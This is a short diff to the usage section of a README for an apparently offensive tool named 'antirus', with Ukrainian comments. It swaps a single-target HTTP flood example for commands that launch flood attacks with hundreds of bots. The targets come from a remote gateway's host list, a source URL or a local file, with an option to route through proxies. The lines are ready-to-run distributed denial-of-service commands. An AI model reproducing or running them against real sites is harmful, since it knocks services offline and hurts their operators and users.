@@ -52,15 +52,9 @@ docker run -it --rm antirus help
 ./antirus help ddatack 
 
 # HTTP flood атака від: (https://t.me/incourse911)
-./antirus ddatack --bots 500 --gateway "http://rockstarbloggers.ru/hosts.json"
-```
-```bash
-
-# HTTP flood атака однієї цілі
-./antirus help target
-
-./antirus target --bots 600 <TARGET_ADDRESS>
-
+./antirus ddatack --api 1 --bots 500 --gateway "http://rockstarbloggers.ru/hosts.json"
+./antirus ddatack --api 2 --bots 100 --onlyproxy --src <SRC_URL>
+./antirus ddatack --api 2 --bots 100 --file <FILE_PATH>
 ```
 
 ## TODO:
